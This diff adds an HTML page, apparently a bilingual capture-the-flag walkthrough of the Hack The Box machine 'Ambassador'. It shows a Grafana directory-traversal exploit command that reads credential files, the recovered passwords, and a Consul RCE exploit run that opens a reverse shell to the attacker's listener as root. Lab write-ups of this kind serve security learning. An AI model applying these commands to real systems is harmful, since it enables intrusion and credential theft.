@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ambassador | Writeup</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+  <nav class="top-nav">
+    <div class="container">
+      <div class="nav-content">
+        <div class="nav-left">
+          <a href="../../index.html" class="back-link" title="Back to home">←</a>
+          <h1 data-i18n="site-title">KDW_LABS</h1>
+        </div>
+        <div class="nav-controls">
+          <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+            <span class="theme-icon">🌙</span>
+          </button>
+          <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+            <span>EN</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <main class="container">
+    <header class="machine-header">
+      <h1 class="machine-title">ambassador</h1>
+      <div class="machine-meta">
+        <span class="badge badge-platform">HTB</span>
+        <span class="badge badge-difficulty-medium">medium</span>
+      </div>
+    </header>
+
+    <article class="machine-content">
+      <div id="content-en" class="lang-content" style="display:none;">
+        <div class="machine-summary">
+          <h2 data-i18n="summary-title">Exploitation Summary</h2>
+          <p><strong>Exploitation process:</strong> Discovered a development server running Grafana 8.2.0, which was
+            vulnerable to directory traversal (CVE-2021-43798). This vulnerability allowed the extraction of Grafana
+            admin credentials and MySQL database credentials. Inside the database, base64-encoded credentials for the
+            <code>developer</code> user were found, enabling SSH access. Once inside, a Git repository in
+            <code>/opt/my-app</code> was inspected, revealing a privileged Consul token in the commit history. Using
+            this token, a Consul RCE exploit was executed to obtain a reverse shell as root.</p>
+          <p><strong>Technologies/Exploits:</strong> Grafana CVE-2021-43798, Git History Leak, Consul RCE.</p>
+        </div>
+        <hr class="summary-divider">
+        <p>Nmap:</p>
+        <p><img src="./media/image2.png" alt="Nmap Results" /></p>
+        <p>On port 80, I see this message. "Read more" doesn't say much, but we already have a confirmed SSH user:
+          <code>developer</code>.</p>
+        <p><img src="./media/image3.png" alt="Web Homepage" /></p>
+        <p>With this info, we might try brute-forcing SSH, MySQL, or Grafana.</p>
+        <p>Whatweb reports:</p>
+        <pre><code class="language-bash">http://10.10.11.183 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.183], MetaGenerator[Hugo 0.94.2], Open-Graph-Protocol[website], Title[Ambassador Development Server], X-UA-Compatible[IE=edge]</code></pre>
+        <p>Gobuster results:</p>
+        <p><img src="./media/image4.png" alt="Gobuster Results" /></p>
+        <p>Gobuster doesn't report anything else interesting.</p>
+        <p>The website appears to be a GoHugo template or something similar: <a
+            href="https://github.com/gohugoio/hugo">https://github.com/gohugoio/hugo</a></p>
+        <p>Brute-forcing SSH and MySQL yielded no results.</p>
+        <p>Checking Grafana, the footer shows version <code>8.2.0</code>. Researching this version leads to a security
+          fix for CVE-2021-43798, which allows directory traversal: <a
+            href="https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/">Grafana
+            Security Fix</a>.</p>
+        <p>I find a PoC exploit on GitHub: <a
+            href="https://github.com/Jroo1053/GrafanaDirInclusion">GrafanaDirInclusion</a>. I execute it and confirm
+          LFI. The exploit uses a list of vulnerable plugins to achieve traversal.</p>
+        <p>With this, I confirm that the <code>developer</code> user exists on the system, and I don't see any others.
+        </p>
+        <p>Reading <code>/etc/grafana/grafana.ini</code>, I find the admin password:
+          <code>messageInABottle685427</code>.</p>
+        <p>With these credentials, I can log into Grafana: <code>admin:messageInABottle685427</code>.</p>
+        <p>I also find MySQL credentials by reading the datasource configuration:</p>
+        <pre><code class="language-bash">python exploit.py -u 10.10.11.183 -p 3000 -f /../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml</code></pre>
+        <pre><code class="language-yaml">Connecting To Server
+Sending Request to http://10.10.11.183:3000/public/plugins/bargauge/../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml
+
+apiVersion: 1
+datasources:
+- name: mysql.yaml
+  type: mysql
+  host: localhost
+  database: grafana
+  user: grafana
+  password: dontStandSoCloseToMe63221!
+  editable: false</code></pre>
+        <p>I log into MySQL. The <code>grafana</code> database is empty, but there's another one called
+          <code>wackywidget</code> containing <code>developer</code> credentials in base64:
+          <code>developer:anEnglishManInNewYork027468</code>.</p>
+        <p>I gain SSH access and get the user flag.</p>
+        <p>Checking open ports with <code>ss -tuln</code>:</p>
+        <p><img src="./media/image1.png" alt="Open Ports" /></p>
+        <p>If I recall correctly, these ports are related to Consul. From another machine's writeup, I saw an exploit:
+          <a href="https://www.exploit-db.com/exploits/51117">Exploit-DB 51117</a>. I tried it, but it didn't work here.
+        </p>
+        <p>I found <a href="https://github.com/owalid/consul-rce">another Consul RCE PoC</a> which reveals the issue: my
+          current token lacks permissions.</p>
+        <pre><code class="language-text">[-] Error creating check vrkmahkqguagpti
+Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'service:write' on "pwn"</code></pre>
+        <p>Trying to list ACL tokens also fails:</p>
+        <pre><code class="language-bash">developer@ambassador:~$ consul acl token list
+Failed to retrieve the token list: Unexpected response code: 403 (Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'acl:read')</code></pre>
+        <p>Further investigation shows that my user's group has write and execute permissions on
+          <code>/etc/consul.d/config.d/</code>. Using <code>pspy64</code>, I see root cleans this directory every 10
+          minutes. It might be possible to modify a file here to gain privileges.</p>
+        <p>However, in <code>/opt/my-app</code> I find a Git repository. Checking <code>git log</code>, I find a
+          committed Consul token:</p>
+        <p><img src="./media/image5.png" alt="Git Log Token" /></p>
+        <p>I use this token with the Consul RCE exploit to get a reverse shell as root:</p>
+        <pre><code class="language-bash">developer@ambassador:~$ python3 exploit.py localhost 8500 10.10.16.6 443 bb03b43b-1d81-d62b-24b5-39540ee469b5
+[+] Request sent successfully, check your listener</code></pre>
+        <p>I receive the connection and get root access:</p>
+        <pre><code class="language-bash">root@ambassador:/# whoami
+root
+root@ambassador:/# cat /root/root.txt
+5ae7fc246445e52206ccfad232fb4890</code></pre>
+      </div>
+
+      <div id="content-es" class="lang-content">
+        <div class="machine-summary">
+          <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+          <p><strong>Resumen del proceso:</strong> Se descubrió un servidor de desarrollo utilizando Grafana 8.2.0, el
+            cual era vulnerable a directory traversal (CVE-2021-43798). Mediante esta vulnerabilidad, se obtuvieron
+            credenciales de administrador de Grafana y de la base de datos MySQL. En la base de datos se encontraron
+            credenciales en base64 para el usuario <code>developer</code>, permitiendo acceso SSH. Una vez dentro, se
+            inspeccionó un repositorio Git en <code>/opt/my-app</code> que contenía un token privilegiado de Consul en
+            el historial de commits. Con este token, se ejecutó un exploit de RCE en Consul para obtener una reverse
+            shell como root.</p>
+          <p><strong>Tecnologías/Exploits:</strong> Grafana CVE-2021-43798, Git History Leak, Consul RCE.</p>
+        </div>
+        <hr class="summary-divider">
+        <p>Nmap:</p>
+        <p><img src="./media/image2.png" alt="Resultados de Nmap" /></p>
+        <p>En el puerto 80 veo este mensaje, "read more" no dice nada más pero ya tenemos un user seguro de ssh,
+          <code>developer</code>:</p>
+        <p><img src="./media/image3.png" alt="Página de Inicio Web" /></p>
+        <p>Con esta info quizá podemos hacer fuerza bruta a SSH, MySQL o Grafana.</p>
+        <p>Whatweb reporta esto:</p>
+        <pre><code class="language-bash">http://10.10.11.183 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.183], MetaGenerator[Hugo 0.94.2], Open-Graph-Protocol[website], Title[Ambassador Development Server], X-UA-Compatible[IE=edge]</code></pre>
+        <p>Gobuster reporta esto:</p>
+        <p><img src="./media/image4.png" alt="Resultados de Gobuster" /></p>
+        <p>Gobuster no reporta nada más interesante.</p>
+        <p>La web parece ser algún tipo de plantilla o algo así de GoHugo: <a
+            href="https://github.com/gohugoio/hugo">https://github.com/gohugoio/hugo</a></p>
+        <p>Probando a hacer fuerza bruta en SSH y MySQL no da resultado.</p>
+        <p>Mirando Grafana veo que indica la versión en el footer: <code>8.2.0</code>. Buscando por la versión veo este
+          post de Grafana: <a
+            href="https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/">Grafana
+            Security Fix</a>.</p>
+        <p>Indican que este CVE-2021-43798 permite directory traversal. Buscando exploits encuentro esta PoC: <a
+            href="https://github.com/Jroo1053/GrafanaDirInclusion">GrafanaDirInclusion</a>.</p>
+        <p>Lo ejecuto y confirmo el LFI. El exploit consigue el acceso a partir de una lista de plugins vulnerables.</p>
+        <p>Con esto confirmo que el usuario <code>developer</code> existe en la máquina, y no veo ningún otro.</p>
+        <p>Leyendo el archivo <code>/etc/grafana/grafana.ini</code> encuentro la contraseña de administrador:
+          <code>messageInABottle685427</code>.</p>
+        <p>Con estos credenciales puedo entrar a Grafana: <code>admin:messageInABottle685427</code>.</p>
+        <p>También encuentro estos credenciales de MySQL leyendo la configuración del datasource:</p>
+        <pre><code class="language-bash">python exploit.py -u 10.10.11.183 -p 3000 -f /../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml</code></pre>
+        <pre><code class="language-yaml">Connecting To Server
+Sending Request to http://10.10.11.183:3000/public/plugins/bargauge/../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml
+
+apiVersion: 1
+datasources:
+- name: mysql.yaml
+  type: mysql
+  host: localhost
+  database: grafana
+  user: grafana
+  password: dontStandSoCloseToMe63221!
+  editable: false</code></pre>
+        <p>Entro al MySQL. La DB de <code>grafana</code> está vacía pero hay otra llamada <code>wackywidget</code> con
+          los credenciales de <code>developer</code> en base64: <code>developer:anEnglishManInNewYork027468</code>.</p>
+        <p>Entro por SSH y consigo la flag de usuario.</p>
+        <p>Con <code>ss -tuln</code> veo unos cuantos puertos abiertos:</p>
+        <p><img src="./media/image1.png" alt="Puertos Abiertos" /></p>
+        <p>Si no recuerdo mal, eran puertos relacionados con Consul. Probé este exploit: <a
+            href="https://www.exploit-db.com/exploits/51117">Exploit-DB 51117</a>, pero no sirvió aquí.</p>
+        <p>Encuentro <a href="https://github.com/owalid/consul-rce">otra PoC de RCE con Consul</a> que aclara el
+          problema: falta de permisos en el token actual.</p>
+        <pre><code class="language-text">[-] Error creating check vrkmahkqguagpti
+Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'service:write' on "pwn"</code></pre>
+        <p>Pruebo a listar los tokens ACL de Consul pero no me deja:</p>
+        <pre><code class="language-bash">developer@ambassador:~$ consul acl token list
+Failed to retrieve the token list: Unexpected response code: 403 (Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'acl:read')</code></pre>
+        <p>Sigo investigando y veo que mi grupo tiene permisos en <code>/etc/consul.d/config.d/</code>. Con
+          <code>pspy64</code> veo que root limpia ese directorio cada 10 minutos. Podría intentar algo ahí.</p>
+        <p>Pero en <code>/opt/my-app</code> veo un repositorio Git. Mirando con <code>git log</code>, encuentro el token
+          de Consul:</p>
+        <p><img src="./media/image5.png" alt="Token en Historial de Git" /></p>
+        <p>Utilizo este token con el exploit de RCE en Consul para obtener una reverse shell como root:</p>
+        <pre><code class="language-bash">developer@ambassador:~$ python3 exploit.py localhost 8500 10.10.16.6 443 bb03b43b-1d81-d62b-24b5-39540ee469b5
+[+] Request sent successfully, check your listener</code></pre>
+        <p>Recibo la conexión y consigo acceso como root:</p>
+        <pre><code class="language-bash">root@ambassador:/# whoami
+root
+root@ambassador:/# cat /root/root.txt
+5ae7fc246445e52206ccfad232fb4890</code></pre>
+      </div>
+    </article>
+  </main>
+  <script src="../../index.js"></script>
+</body>
+
+</html>
